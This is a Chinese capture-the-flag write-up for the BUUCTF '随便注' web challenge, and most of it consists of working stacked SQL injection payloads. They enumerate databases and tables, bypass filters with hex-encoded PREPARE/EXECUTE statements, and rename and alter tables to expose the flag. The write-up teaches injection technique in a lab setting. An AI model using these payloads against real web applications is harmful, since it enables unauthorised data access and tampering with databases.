BUUCTF_WEB_随便注

2019-07-11

取材于某次真实环境渗透，只说一句话：开发和安全缺一不可

堆叠注入

加引号 ?inject=1'，页面报错。

堆叠注入，查库名。

?inject=1';show databases;

查表名。
?inject=1';show tables;

发现两个表，分别为 1919810931114514 ， words 。

查列。 inject=1’;show columns from `1919810931114514`;

此路不通。使用prepare调用。
payload例: Set @t=0x73656c65637420312c323b;prepare x from @t;execute x;

0x73656c65637420312c323b经过16进制转字符串得到select 1,2;

即把查询语句经过一次16进制转换。

未转换前的payload为show coulmns from supersqli.1919810931114514

16进制转换0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134，
即最终的payload为?inject=1';Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;prepare x from @t;execute x;

不止可以用hex()绕过，还可以使用char()绕过。

这题甚至还有改表名的骚操作。

他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。
这样就可以让程序直接查询出 flag 了。
构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。

?inject=1%27;RENAME%20TABLE%20words%20TO%20words1;RENAME%20TABLE%201919810931114514%20TO%20words;ALTER%20TABLE%20words%20CHANGE%20flag%20id%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;#
?inject=1’;RENAME TABLE words TO words1;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
